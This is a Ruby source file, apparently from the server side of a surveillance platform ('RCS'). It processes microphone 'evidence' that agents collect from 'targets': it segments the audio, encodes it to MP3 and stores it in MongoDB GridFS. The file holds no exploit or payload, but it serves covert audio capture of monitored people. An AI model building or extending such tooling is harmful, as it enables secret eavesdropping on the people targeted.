require 'ffi'
require 'mongo'
require 'mongoid'
require 'stringio'

require 'rcs-common/trace'

require_relative 'libs/wave'
require_relative 'libs/SRC/src'
require_relative 'libs/lame/lame'
require_relative 'libs/speex/speex'

module RCS
module Worker

  class MicRecording
    include Tracer

    attr_accessor :timecode, :duration, :sample_rate, :bid, :raw_counter

    def initialize(evidence, agent, target)
      @bid = BSON::ObjectId.new
      @target = target
      @mic_id = evidence[:data][:mic_id]
      @sample_rate = evidence[:data][:sample_rate]
      @start_time = evidence[:da]
      @duration = 0
      @raw_counter = 0
      @evidence = store evidence[:da], agent, @target
    end

    def accept?(evidence)
      @mic_id == evidence[:data][:mic_id] and @duration < 1800 # split every 30 minutes
    end

    def file_name
      "#{@mic_id.to_i.to_s}:#{@start_time}"
    end

    def close!
      yield @evidence
    end

    def feed(evidence)
      @raw_counter += 1
      @duration += (1.0 * evidence[:wav].size) / @sample_rate

      left_pcm = Array.new evidence[:wav]
      right_pcm = Array.new evidence[:wav]

      yield @sample_rate, left_pcm, right_pcm
    end

    def update_attributes(hash)
      @evidence.update_attributes(hash) unless @evidence.nil?
    end

    def store(acquired, agent, target)
      coll = ::Evidence.collection_class(target[:_id].to_s)
      coll.create do |ev|
        ev._id = @bid
        ev.aid = agent[:_id].to_s
        ev.type = :mic

        ev.da = acquired.to_i
        ev.dr = Time.now.to_i
        ev.rel = 0
        ev.blo = false
        ev.note = ""

        ev.data ||= Hash.new
        ev.data[:duration] = 0

        # update the evidence statistics
        # TODO: where do we add the size to the stats? (probably in the same place where we will forward to connectors)
        RCS::Worker::StatsManager.instance.add evidence: 1

        ev.safely.save!
        ev
      end
    end
  end

  class MicProcessor
    include Tracer

    def tc(evidence)
      evidence[:da] - (evidence[:wav].size / evidence[:data][:sample_rate])
    end

    def feed(evidence, agent, target)
      @mic ||= MicRecording.new(evidence, agent, target)
      unless @mic.accept? evidence
        @mic.close! {|evidence| yield evidence}
        @mic = MicRecording.new(evidence, agent, target)
        trace :debug, "created new MIC processor #{@mic.bid}"
      end

      @mic.feed(evidence) do |sample_rate, left_pcm, right_pcm|
        encode_mp3(sample_rate, left_pcm, right_pcm) do |mp3_bytes|
          #File.open("#{@mic.file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }
          write_to_grid(@mic, mp3_bytes, target, agent)
        end
      end

      return @mic.bid, @mic.raw_counter
    end

    def encode_mp3(sample_rate, left_pcm, right_pcm)
      # MP3Encoder will take care of resampling if necessary
      @encoder ||= ::MP3Encoder.new(2, sample_rate)
      unless @encoder.nil?
        @encoder.feed(left_pcm, right_pcm) do |mp3_bytes|
          yield mp3_bytes
        end
      end
    end

    def write_to_grid(mic, mp3_bytes, target, agent)
      db = RCS::DB::DB.instance.new_mongo_connection
      fs = Mongo::GridFileSystem.new(db, "grid.#{target[:_id]}")

      fs.open(mic.file_name, 'a') do |f|
        f.write mp3_bytes
        mic.update_attributes({data: {_grid: f.files_id, _grid_size: f.file_length, duration: mic.duration}})
      end
      agent.stat.size += mp3_bytes.size
      agent.save
    end
  end

end # Worker
end # RCS